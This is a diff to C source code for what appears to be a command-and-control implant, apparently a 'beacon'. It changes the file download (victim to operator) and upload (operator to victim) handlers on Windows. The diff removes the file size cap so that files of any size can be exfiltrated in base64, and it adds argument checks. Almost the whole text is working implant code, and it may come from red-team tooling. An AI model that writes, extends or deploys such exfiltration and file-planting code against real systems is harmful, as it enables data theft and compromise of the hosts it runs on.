@@ -2,6 +2,8 @@
 #include <stdio.h>
 #include <string.h>
 
+/* ── base64 ─────────────────────────────────────────────── */
+
 static const char B64_CHARS[] =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
@@ -51,7 +53,13 @@ static int b64_decode(const char *src, int src_len, BYTE *dst, int dst_sz) {
     return o;
 }
 
+/* ── download (beacon → operator) ──────────────────────── */
 void beacon_exec_download(PARSED_TASK *task, TASK_RESULT *result) {
+    if (!task->args) {
+        snprintf(result->error, sizeof(result->error), "no path specified");
+        return;
+    }
+
     HANDLE hFile = CreateFileA(task->args, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
@@ -68,12 +76,18 @@ void beacon_exec_download(PARSED_TASK *task, TASK_RESULT *result) {
     }
 
     DWORD raw_sz = (DWORD)fsize.QuadPart;
-    DWORD raw_cap = (result->output_cap / 4) * 3;
-    if (raw_sz > raw_cap) {
-        CloseHandle(hFile);
-        snprintf(result->error, sizeof(result->error),
-                 "file too large (%lu bytes, max %lu)", raw_sz, raw_cap);
-        return;
+
+    /* grow output buffer to fit base64-encoded content */
+    DWORD b64_needed = ((raw_sz + 2) / 3) * 4 + 4;
+    if (b64_needed > result->output_cap) {
+        char *tmp = (char *)HeapReAlloc(GetProcessHeap(), 0, result->output, b64_needed);
+        if (!tmp) {
+            CloseHandle(hFile);
+            snprintf(result->error, sizeof(result->error), "out of memory");
+            return;
+        }
+        result->output     = tmp;
+        result->output_cap = b64_needed;
     }
 
     BYTE *raw = (BYTE *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)raw_sz);
@@ -97,7 +111,12 @@ void beacon_exec_download(PARSED_TASK *task, TASK_RESULT *result) {
     HeapFree(GetProcessHeap(), 0, raw);
 }
 
+/* ── upload (operator → beacon) ────────────────────────── */
 void beacon_exec_upload(PARSED_TASK *task, TASK_RESULT *result) {
+    if (!task->args) {
+        snprintf(result->error, sizeof(result->error), "no destination path");
+        return;
+    }
     if (!task->data || task->data_len <= 0) {
         snprintf(result->error, sizeof(result->error), "no data payload");
         return;
@@ -132,5 +151,5 @@ void beacon_exec_upload(PARSED_TASK *task, TASK_RESULT *result) {
     HeapFree(GetProcessHeap(), 0, decoded);
 
     result->output_len = (DWORD)snprintf(result->output, result->output_cap,
-        "uploaded %d bytes → %s", dec_len, task->args);
+        "uploaded %d bytes -> %s", dec_len, task->args);
 }
